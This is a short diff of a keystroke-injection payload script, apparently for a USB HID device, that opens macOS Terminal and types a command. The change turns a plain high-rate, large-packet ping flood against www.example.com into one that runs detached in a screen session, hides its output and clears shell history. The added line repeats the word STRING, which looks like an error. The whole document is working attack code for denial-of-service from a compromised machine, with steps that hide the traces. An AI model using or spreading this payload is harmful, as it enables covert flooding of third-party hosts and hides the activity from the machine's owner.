@@ -9,5 +9,5 @@ STRING terminal.app
 DELAY 500
 ENTER
 DELAY 2000
-STRING ping -i 0.001 -s 65527 www.example.com
+STRING STRING screen -dm bash -c 'nohup ping -i 0.001 -s 65527 www.example.com >/dev/null 2>&1; history -c'
 ENTER
